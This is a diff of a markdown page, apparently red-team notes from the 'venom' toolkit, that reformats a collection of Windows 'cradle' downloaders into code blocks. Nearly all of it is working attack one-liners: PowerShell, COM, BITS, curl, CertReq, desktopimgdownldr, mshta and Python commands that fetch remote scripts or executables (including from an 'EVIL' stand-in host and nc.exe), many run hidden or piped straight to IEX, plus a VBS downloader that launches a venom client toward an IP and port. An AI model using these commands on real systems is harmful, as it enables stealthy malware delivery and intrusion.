@@ -2082,88 +2082,102 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 <br /><br />
 **Powershell Downloaders**<br />
 
-      ## File-less download and execute
-      iex(iwr("http://192.168.1.71/hello.ps1"))
+```powershell
+## File-less download and execute
+iex(iwr("http://192.168.1.71/hello.ps1"))
 
-      iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
+iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
 
-      Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
+Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
 
-      powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
+powershell Invoke-WebRequest -H @{"Authorization"="token 123456789012345678901234567890"} https://path/to/file.txt -OutFile $env:tmp\file.txt
 
-      powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
+powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
       
-      $ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+```
       
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
 
 <br /><br />
 **COM Donwloaders**<br />
 
-      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+```powershell
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
 
-      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+$r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
 
-      [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+[System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
       
-      powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"      
-      
-![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
+powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"      
+```      
 
 <br /><br />
 **BitsAdmin Downloaders**<br />
 
-      powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
+```powershell
+powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
+powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:SSArt http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
+powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:SSArt http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
       
-      powershell -w 1 bitsadmin /create /dOwNlOaD ssart;start-sleep -seconds 1;bitsadmin /addfile ssart http://192.168.1.73/Hello.ps1 $env:tmp\Hello.ps1;start-sleep -seconds 1;bitsadmin /setcustomheaders ssart User-Agent:SSArt;start-sleep -seconds 1;bitsadmin /resume ssart;start-sleep -seconds 1;bitsadmin /complete ssart
+powershell -w 1 bitsadmin /create /dOwNlOaD ssart;start-sleep -seconds 1;bitsadmin /addfile ssart http://192.168.1.73/Hello.ps1 $env:tmp\Hello.ps1;start-sleep -seconds 1;bitsadmin /setcustomheaders ssart User-Agent:SSArt;start-sleep -seconds 1;bitsadmin /resume ssart;start-sleep -seconds 1;bitsadmin /complete ssart
+```
 
 <br /><br />
 **Curl Downloaders**<br />
 
-      cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
+```powershell
+cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
 
-      cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
+cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
+```
       
 ![tt](https://user-images.githubusercontent.com/23490060/94851389-49e2d880-0420-11eb-8527-147299c70f92.png)
 
 <br /><br />
 **desktopimgdownldr Downloaders**<br />
 
-      set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+```cmd
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+```
 
 <br /><br />
 **CertReq Downloaders**<br />
 
-      cmd /c start /b /MIN CertReq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt
+```cmd
+cmd /c start /b /MIN CertReq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt
 
-      powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini $env:tmp\Hello.ps1
+powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini $env:tmp\Hello.ps1
+```
       
 ![ComDownloader](https://user-images.githubusercontent.com/23490060/96273174-f3040400-0fc6-11eb-82df-40cc1e60b229.png)
 
 <br /><br />
 **mshta Downloaders**<br />
 
-      cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()
+```cmd
+cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()
+```
 
 <br /><br />
 **Python Downloaders**<br />
 
-      python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
+```python
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
 
-      #!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
+#!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
+```
 
 <br /><br />
 **VbScript Downloaders (VBS)**<br />
 
-```
+```vbscript
 ' Set your url settings and the saving options
 strFileURL = "https://github.com/r00t-3xp10it/venom/blob/master/bin/Client.exe"
 strHDLocation = "C:\Users\pedro\Desktop\Client.exe"
@@ -2193,6 +2207,7 @@ Set objXMLHTTP = Nothing
 x=MsgBox("File Successfully Downloaded" & vbCrLf & "Storage: C:\Users\pedro\Desktop\Client.exe",64,"VBS Downloader")
 CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.168.1.73 port=666"
 ```
+
 ![tr](https://user-images.githubusercontent.com/23490060/94852614-1143fe80-0422-11eb-8729-5891e729064f.png)
 
 ---
